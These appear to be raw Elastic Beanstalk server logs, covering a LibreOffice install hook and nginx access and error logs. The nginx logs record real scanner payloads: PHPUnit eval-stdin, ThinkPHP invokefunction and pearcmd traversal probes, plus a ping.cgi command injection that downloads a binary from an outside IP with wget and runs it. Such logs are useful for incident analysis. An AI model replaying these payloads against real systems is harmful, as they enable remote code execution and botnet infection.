----------------------------------------
/var/log/eb-hooks.log
----------------------------------------
2026/04/23 07:00:33.762367 [INFO] Running command: .platform/hooks/prebuild/01_libreoffice.sh
2026/04/23 07:00:35.634564 [INFO] [prebuild] Checking LibreOffice...
[prebuild] Installing LibreOffice...
Amazon Linux 2023 repository                     48 kB/s | 3.6 kB     00:00    
Amazon Linux 2023 Kernel Livepatch repository    39 kB/s | 2.9 kB     00:00    
No match for argument: libreoffice-core
No match for argument: libreoffice-calc
No match for argument: libreoffice-pyuno
Last metadata expiration check: 0:00:01 ago on Thu Apr 23 07:00:34 2026.
No match for argument: libreoffice

2026/04/23 07:00:35.634626 [INFO] Error: Unable to find a match: libreoffice

2026/04/23 07:04:35.821542 [INFO] Running command: .platform/hooks/prebuild/01_libreoffice.sh
2026/04/23 07:04:57.927837 [INFO] [prebuild] Checking LibreOffice...
[prebuild] Installing LibreOffice from TDF RPMs...
  libxslt-1.1.43-1.amzn2023.0.3.x86_64                                          
  pixman-0.43.4-1.amzn2023.0.4.x86_64                                           
  xml-common-0.6.3-56.amzn2023.0.2.noarch                                       

Complete!
Last metadata expiration check: 0:04:06 ago on Thu Apr 23 07:00:34 2026.
Dependencies resolved.
================================================================================
 Package                       Arch   Version                 Repository   Size
================================================================================
Installing:
 google-noto-cjk-fonts         noarch 20230817-2.amzn2023.0.1 amazonlinux 9.2 k
Installing dependencies:
 google-noto-cjk-fonts-common  noarch 20230817-2.amzn2023.0.1 amazonlinux  12 k
 google-noto-sans-cjk-ttc-fonts
                               noarch 20230817-2.amzn2023.0.1 amazonlinux  81 M
 google-noto-serif-cjk-ttc-fonts
                               noarch 20230817-2.amzn2023.0.1 amazonlinux 116 M

Transaction Summary
================================================================================
Install  4 Packages

Total download size: 197 M
Installed size: 298 M
Downloading Packages:
(1/4): google-noto-cjk-fonts-20230817-2.amzn202 180 kB/s | 9.2 kB     00:00    
(2/4): google-noto-cjk-fonts-common-20230817-2. 196 kB/s |  12 kB     00:00    
(3/4): google-noto-sans-cjk-ttc-fonts-20230817-  61 MB/s |  81 MB     00:01    
(4/4): google-noto-serif-cjk-ttc-fonts-20230817  55 MB/s | 116 MB     00:02    
--------------------------------------------------------------------------------
Total                                            89 MB/s | 197 MB     00:02     
Running transaction check
Transaction check succeeded.
Running transaction test
Transaction test succeeded.
Running transaction
  Preparing        :                                                        1/1 
  Installing       : google-noto-cjk-fonts-common-20230817-2.amzn2023.0.1   1/4 
  Installing       : google-noto-sans-cjk-ttc-fonts-20230817-2.amzn2023.0   2/4 
  Installing       : google-noto-serif-cjk-ttc-fonts-20230817-2.amzn2023.   3/4 
  Installing       : google-noto-cjk-fonts-20230817-2.amzn2023.0.1.noarch   4/4 
  Running scriptlet: google-noto-cjk-fonts-20230817-2.amzn2023.0.1.noarch   4/4 
  Verifying        : google-noto-cjk-fonts-20230817-2.amzn2023.0.1.noarch   1/4 
  Verifying        : google-noto-cjk-fonts-common-20230817-2.amzn2023.0.1   2/4 
  Verifying        : google-noto-sans-cjk-ttc-fonts-20230817-2.amzn2023.0   3/4 
  Verifying        : google-noto-serif-cjk-ttc-fonts-20230817-2.amzn2023.   4/4 

Installed:
  google-noto-cjk-fonts-20230817-2.amzn2023.0.1.noarch                          
  google-noto-cjk-fonts-common-20230817-2.amzn2023.0.1.noarch                   
  google-noto-sans-cjk-ttc-fonts-20230817-2.amzn2023.0.1.noarch                 
  google-noto-serif-cjk-ttc-fonts-20230817-2.amzn2023.0.1.noarch                

Complete!
[prebuild] Downloading https://download.documentfoundation.org/libreoffice/stable/24.2.7/rpm/x86_64/LibreOffice_24.2.7_Linux_x86-64_rpm.tar.gz



----------------------------------------
/var/log/nginx/access.log
----------------------------------------
166.88.169.176 - - [23/Apr/2026:06:28:41 +0000] "POST / HTTP/1.1" 405 31 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
115.191.32.57 - - [23/Apr/2026:07:01:27 +0000] "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
115.191.32.57 - - [23/Apr/2026:07:01:27 +0000] "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
115.191.32.57 - - [23/Apr/2026:07:01:28 +0000] "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
115.191.32.57 - - [23/Apr/2026:07:01:28 +0000] "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
115.191.32.57 - - [23/Apr/2026:07:01:28 +0000] "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
115.191.32.57 - - [23/Apr/2026:07:01:28 +0000] "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
115.191.32.57 - - [23/Apr/2026:07:01:29 +0000] "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
115.191.32.57 - - [23/Apr/2026:07:01:29 +0000] "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
115.191.32.57 - - [23/Apr/2026:07:01:29 +0000] "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
115.191.32.57 - - [23/Apr/2026:07:01:29 +0000] "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
115.191.32.57 - - [23/Apr/2026:07:01:29 +0000] "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
115.191.32.57 - - [23/Apr/2026:07:01:29 +0000] "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
115.191.32.57 - - [23/Apr/2026:07:01:29 +0000] "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
115.191.32.57 - - [23/Apr/2026:07:01:30 +0000] "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
115.191.32.57 - - [23/Apr/2026:07:01:30 +0000] "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
115.191.32.57 - - [23/Apr/2026:07:01:30 +0000] "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
115.191.32.57 - - [23/Apr/2026:07:01:30 +0000] "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
115.191.32.57 - - [23/Apr/2026:07:01:30 +0000] "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
115.191.32.57 - - [23/Apr/2026:07:01:30 +0000] "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
115.191.32.57 - - [23/Apr/2026:07:01:31 +0000] "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
115.191.32.57 - - [23/Apr/2026:07:01:31 +0000] "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
115.191.32.57 - - [23/Apr/2026:07:01:31 +0000] "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
115.191.32.57 - - [23/Apr/2026:07:01:32 +0000] "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
115.191.32.57 - - [23/Apr/2026:07:01:32 +0000] "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
115.191.32.57 - - [23/Apr/2026:07:01:32 +0000] "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
115.191.32.57 - - [23/Apr/2026:07:01:33 +0000] "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
115.191.32.57 - - [23/Apr/2026:07:01:33 +0000] "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
115.191.32.57 - - [23/Apr/2026:07:01:33 +0000] "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
115.191.32.57 - - [23/Apr/2026:07:01:33 +0000] "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
115.191.32.57 - - [23/Apr/2026:07:01:33 +0000] "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
115.191.32.57 - - [23/Apr/2026:07:01:34 +0000] "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
115.191.32.57 - - [23/Apr/2026:07:01:34 +0000] "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
115.191.32.57 - - [23/Apr/2026:07:01:34 +0000] "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
115.191.32.57 - - [23/Apr/2026:07:01:34 +0000] "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
115.191.32.57 - - [23/Apr/2026:07:01:35 +0000] "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
115.191.32.57 - - [23/Apr/2026:07:01:35 +0000] "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
115.191.32.57 - - [23/Apr/2026:07:01:35 +0000] "GET /index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 200 902 "-" "libredtail-http" "-"
115.191.32.57 - - [23/Apr/2026:07:01:35 +0000] "GET /public/index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 200 902 "-" "libredtail-http" "-"
115.191.32.57 - - [23/Apr/2026:07:01:35 +0000] "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\x22hi\x22));?>+/tmp/index1.php HTTP/1.1" 200 902 "-" "libredtail-http" "-"
115.191.32.57 - - [23/Apr/2026:07:01:36 +0000] "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1" 200 902 "-" "libredtail-http" "-"
115.191.32.57 - - [23/Apr/2026:07:01:36 +0000] "GET /containers/json HTTP/1.1" 200 902 "-" "libredtail-http" "-"


----------------------------------------
/var/log/nginx/error.log
----------------------------------------
2026/04/22 23:41:05 [warn] 30873#30873: *382 using uninitialized "year" variable while logging request, client: 179.6.101.90, server: , request: "GET /ping.cgi?pingIpAddress=google.fr;wget%20http://37.48.254.120/arm7%20-O%20/tmp/arm7;chmod%20777%20/tmp/arm7;/tmp/arm7%27/&sessionKey=1039 HTTP/1.1"
2026/04/22 23:41:05 [warn] 30873#30873: *382 using uninitialized "month" variable while logging request, client: 179.6.101.90, server: , request: "GET /ping.cgi?pingIpAddress=google.fr;wget%20http://37.48.254.120/arm7%20-O%20/tmp/arm7;chmod%20777%20/tmp/arm7;/tmp/arm7%27/&sessionKey=1039 HTTP/1.1"
2026/04/22 23:41:05 [warn] 30873#30873: *382 using uninitialized "day" variable while logging request, client: 179.6.101.90, server: , request: "GET /ping.cgi?pingIpAddress=google.fr;wget%20http://37.48.254.120/arm7%20-O%20/tmp/arm7;chmod%20777%20/tmp/arm7;/tmp/arm7%27/&sessionKey=1039 HTTP/1.1"
2026/04/22 23:41:05 [warn] 30873#30873: *382 using uninitialized "hour" variable while logging request, client: 179.6.101.90, server: , request: "GET /ping.cgi?pingIpAddress=google.fr;wget%20http://37.48.254.120/arm7%20-O%20/tmp/arm7;chmod%20777%20/tmp/arm7;/tmp/arm7%27/&sessionKey=1039 HTTP/1.1"
2026/04/23 00:43:41 [warn] 30873#30873: *393 using uninitialized "year" variable while logging request, client: 45.135.194.20, server: , request: "CONNECT google.com:443 HTTP/1.1"
2026/04/23 00:43:41 [warn] 30873#30873: *393 using uninitialized "month" variable while logging request, client: 45.135.194.20, server: , request: "CONNECT google.com:443 HTTP/1.1"
2026/04/23 00:43:41 [warn] 30873#30873: *393 using uninitialized "day" variable while logging request, client: 45.135.194.20, server: , request: "CONNECT google.com:443 HTTP/1.1"
2026/04/23 00:43:41 [warn] 30873#30873: *393 using uninitialized "hour" variable while logging request, client: 45.135.194.20, server: , request: "CONNECT google.com:443 HTTP/1.1"
2026/04/23 02:58:52 [warn] 30872#30872: *409 using uninitialized "year" variable while logging request, client: 172.239.117.241, server: , request: "  üÔ6Ÿè¾ !ñgÁ¶g^1>•&gQ5]Nå§ YdÖ=˜ Tj—'kyoœ%YB¢’,:vq+Êp×ë#fPúÝ:ž >À,À0 ŸÌ©Ì¨ÌªÀ+À/ žÀ$À( kÀ#À' gÀ"
2026/04/23 02:58:52 [warn] 30872#30872: *409 using uninitialized "month" variable while logging request, client: 172.239.117.241, server: , request: "  üÔ6Ÿè¾ !ñgÁ¶g^1>•&gQ5]Nå§ YdÖ=˜ Tj—'kyoœ%YB¢’,:vq+Êp×ë#fPúÝ:ž >À,À0 ŸÌ©Ì¨ÌªÀ+À/ žÀ$À( kÀ#À' gÀ"
2026/04/23 02:58:52 [warn] 30872#30872: *409 using uninitialized "day" variable while logging request, client: 172.239.117.241, server: , request: "  üÔ6Ÿè¾ !ñgÁ¶g^1>•&gQ5]Nå§ YdÖ=˜ Tj—'kyoœ%YB¢’,:vq+Êp×ë#fPúÝ:ž >À,À0 ŸÌ©Ì¨ÌªÀ+À/ žÀ$À( kÀ#À' gÀ"
2026/04/23 02:58:52 [warn] 30872#30872: *409 using uninitialized "hour" variable while logging request, client: 172.239.117.241, server: , request: "  üÔ6Ÿè¾ !ñgÁ¶g^1>•&gQ5]Nå§ YdÖ=˜ Tj—'kyoœ%YB¢’,:vq+Êp×ë#fPúÝ:ž >À,À0 ŸÌ©Ì¨ÌªÀ+À/ žÀ$À( kÀ#À' gÀ"
2026/04/23 04:31:00 [warn] 30872#30872: *424 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/5/00/0000000005 while reading upstream, client: 222.107.157.9, server: , request: "GET /static/js/main.fc8cb9e9.js HTTP/1.1", upstream: "http://127.0.0.1:8000/static/js/main.fc8cb9e9.js", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
2026/04/23 04:31:10 [warn] 30872#30872: *432 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/6/00/0000000006 while reading upstream, client: 222.107.157.9, server: , request: "GET /static/js/main.fc8cb9e9.js HTTP/1.1", upstream: "http://127.0.0.1:8000/static/js/main.fc8cb9e9.js", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
2026/04/23 04:31:16 [warn] 30872#30872: *424 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/7/00/0000000007 while reading upstream, client: 222.107.157.9, server: , request: "GET /api/ublox/data HTTP/1.1", upstream: "http://127.0.0.1:8000/api/ublox/data", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
2026/04/23 04:31:33 [warn] 30872#30872: *432 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/8/00/0000000008 while reading upstream, client: 222.107.157.9, server: , request: "GET /api/ublox/data HTTP/1.1", upstream: "http://127.0.0.1:8000/api/ublox/data", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
2026/04/23 04:31:54 [warn] 30872#30872: *424 a client request body is buffered to a temporary file /var/lib/nginx/tmp/client_body/0000000009, client: 222.107.157.9, server: , request: "POST /api/invoice-batch/preview HTTP/1.1", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
2026/04/23 04:33:14 [warn] 30872#30872: *448 using uninitialized "year" variable while logging request, client: 198.235.24.26, server: , request: " Ê  Æ×FÃô9äÆ<oMl…˜}Ÿs^¡fI_¦‘èI	"
2026/04/23 04:33:14 [warn] 30872#30872: *448 using uninitialized "month" variable while logging request, client: 198.235.24.26, server: , request: " Ê  Æ×FÃô9äÆ<oMl…˜}Ÿs^¡fI_¦‘èI	"
2026/04/23 04:33:14 [warn] 30872#30872: *448 using uninitialized "day" variable while logging request, client: 198.235.24.26, server: , request: " Ê  Æ×FÃô9äÆ<oMl…˜}Ÿs^¡fI_¦‘èI	"
2026/04/23 04:33:14 [warn] 30872#30872: *448 using uninitialized "hour" variable while logging request, client: 198.235.24.26, server: , request: " Ê  Æ×FÃô9äÆ<oMl…˜}Ÿs^¡fI_¦‘èI	"
2026/04/23 04:33:14 [warn] 30872#30872: *447 using uninitialized "year" variable while logging request, client: 198.235.24.26, server: , request: " î  êÓó-F²¾ED8öM¨`‘ñë]zÚåI6ß7€àV~ è æåà]â}V©¢<ÛiJ³ZÚ†œ¨ðŒŸ6Ó &À+À/À,À0Ì©Ì¨À	ÀÀ"
2026/04/23 04:33:14 [warn] 30872#30872: *447 using uninitialized "month" variable while logging request, client: 198.235.24.26, server: , request: " î  êÓó-F²¾ED8öM¨`‘ñë]zÚåI6ß7€àV~ è æåà]â}V©¢<ÛiJ³ZÚ†œ¨ðŒŸ6Ó &À+À/À,À0Ì©Ì¨À	ÀÀ"
2026/04/23 04:33:14 [warn] 30872#30872: *447 using uninitialized "day" variable while logging request, client: 198.235.24.26, server: , request: " î  êÓó-F²¾ED8öM¨`‘ñë]zÚåI6ß7€àV~ è æåà]â}V©¢<ÛiJ³ZÚ†œ¨ðŒŸ6Ó &À+À/À,À0Ì©Ì¨À	ÀÀ"
2026/04/23 04:33:14 [warn] 30872#30872: *447 using uninitialized "hour" variable while logging request, client: 198.235.24.26, server: , request: " î  êÓó-F²¾ED8öM¨`‘ñë]zÚåI6ß7€àV~ è æåà]â}V©¢<ÛiJ³ZÚ†œ¨ðŒŸ6Ó &À+À/À,À0Ì©Ì¨À	ÀÀ"
2026/04/23 04:50:27 [warn] 30873#30873: *455 using uninitialized "year" variable while logging request, client: 93.174.93.12, server: , request: "o kRHÅ#÷:Nßâ´‚/ÿ	TŸ§Äy°hÆŒ¤="á˜ „´,…¯nãY»bhlÿ(=':©‚ÙoÈ¢×“˜´ï€å¹ (À"
2026/04/23 04:50:27 [warn] 30873#30873: *455 using uninitialized "month" variable while logging request, client: 93.174.93.12, server: , request: "o kRHÅ#÷:Nßâ´‚/ÿ	TŸ§Äy°hÆŒ¤="á˜ „´,…¯nãY»bhlÿ(=':©‚ÙoÈ¢×“˜´ï€å¹ (À"
2026/04/23 04:50:27 [warn] 30873#30873: *455 using uninitialized "day" variable while logging request, client: 93.174.93.12, server: , request: "o kRHÅ#÷:Nßâ´‚/ÿ	TŸ§Äy°hÆŒ¤="á˜ „´,…¯nãY»bhlÿ(=':©‚ÙoÈ¢×“˜´ï€å¹ (À"
2026/04/23 04:50:27 [warn] 30873#30873: *455 using uninitialized "hour" variable while logging request, client: 93.174.93.12, server: , request: "o kRHÅ#÷:Nßâ´‚/ÿ	TŸ§Äy°hÆŒ¤="á˜ „´,…¯nãY»bhlÿ(=':©‚ÙoÈ¢×“˜´ï€å¹ (À"
2026/04/23 04:50:58 [warn] 30873#30873: *463 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/0/01/0000000010 while reading upstream, client: 211.234.206.230, server: , request: "GET /static/js/main.fc8cb9e9.js HTTP/1.1", upstream: "http://127.0.0.1:8000/static/js/main.fc8cb9e9.js", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
2026/04/23 04:53:33 [warn] 30873#30873: *471 a client request body is buffered to a temporary file /var/lib/nginx/tmp/client_body/0000000011, client: 211.234.206.230, server: , request: "POST /api/export HTTP/1.1", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
2026/04/23 04:54:09 [warn] 30872#30872: *476 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/2/01/0000000012 while reading upstream, client: 211.234.206.230, server: , request: "GET /api/auo/data HTTP/1.1", upstream: "http://127.0.0.1:8000/api/auo/data", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
2026/04/23 05:02:26 [warn] 30872#30872: *480 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/3/01/0000000013 while reading upstream, client: 222.107.157.9, server: , request: "GET /static/js/main.fc8cb9e9.js HTTP/1.1", upstream: "http://127.0.0.1:8000/static/js/main.fc8cb9e9.js", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
2026/04/23 05:02:43 [warn] 30872#30872: *480 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/4/01/0000000014 while reading upstream, client: 222.107.157.9, server: , request: "GET /api/auo/data HTTP/1.1", upstream: "http://127.0.0.1:8000/api/auo/data", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
2026/04/23 05:02:50 [warn] 30872#30872: *480 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/5/01/0000000015 while reading upstream, client: 222.107.157.9, server: , request: "GET /api/ublox/data HTTP/1.1", upstream: "http://127.0.0.1:8000/api/ublox/data", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
2026/04/23 05:02:56 [warn] 30872#30872: *480 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/6/01/0000000016 while reading upstream, client: 222.107.157.9, server: , request: "GET /api/auo/data HTTP/1.1", upstream: "http://127.0.0.1:8000/api/auo/data", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
2026/04/23 05:03:13 [warn] 30872#30872: *480 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/7/01/0000000017 while reading upstream, client: 222.107.157.9, server: , request: "GET /api/ublox/data HTTP/1.1", upstream: "http://127.0.0.1:8000/api/ublox/data", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
2026/04/23 05:03:19 [warn] 30872#30872: *480 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/8/01/0000000018 while reading upstream, client: 222.107.157.9, server: , request: "GET /api/auo/data HTTP/1.1", upstream: "http://127.0.0.1:8000/api/auo/data", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
2026/04/23 05:14:50 [warn] 30872#30872: *500 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/9/01/0000000019 while reading upstream, client: 222.107.157.9, server: , request: "GET /api/auo/data HTTP/1.1", upstream: "http://127.0.0.1:8000/api/auo/data", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
2026/04/23 05:17:20 [warn] 30872#30872: *506 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/0/02/0000000020 while reading upstream, client: 222.107.157.9, server: , request: "POST /api/invoice/generate HTTP/1.1", upstream: "http://127.0.0.1:8000/api/invoice/generate", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
2026/04/23 05:20:05 [warn] 30872#30872: *514 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/1/02/0000000021 while reading upstream, client: 222.107.157.9, server: , request: "GET /api/auo/data HTTP/1.1", upstream: "http://127.0.0.1:8000/api/auo/data", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
2026/04/23 05:24:18 [warn] 30872#30872: *527 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/2/02/0000000022 while reading upstream, client: 222.107.157.9, server: , request: "GET /api/auo/data HTTP/1.1", upstream: "http://127.0.0.1:8000/api/auo/data", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
2026/04/23 05:24:43 [warn] 30872#30872: *527 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/3/02/0000000023 while reading upstream, client: 222.107.157.9, server: , request: "GET /api/auo/data HTTP/1.1", upstream: "http://127.0.0.1:8000/api/auo/data", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
2026/04/23 05:38:27 [warn] 30873#30873: *537 using uninitialized "year" variable while logging request, client: 185.242.226.113, server: , request: " ‹  ‡pâ¦?%Œé~¨|…È]&Ù“Œ"
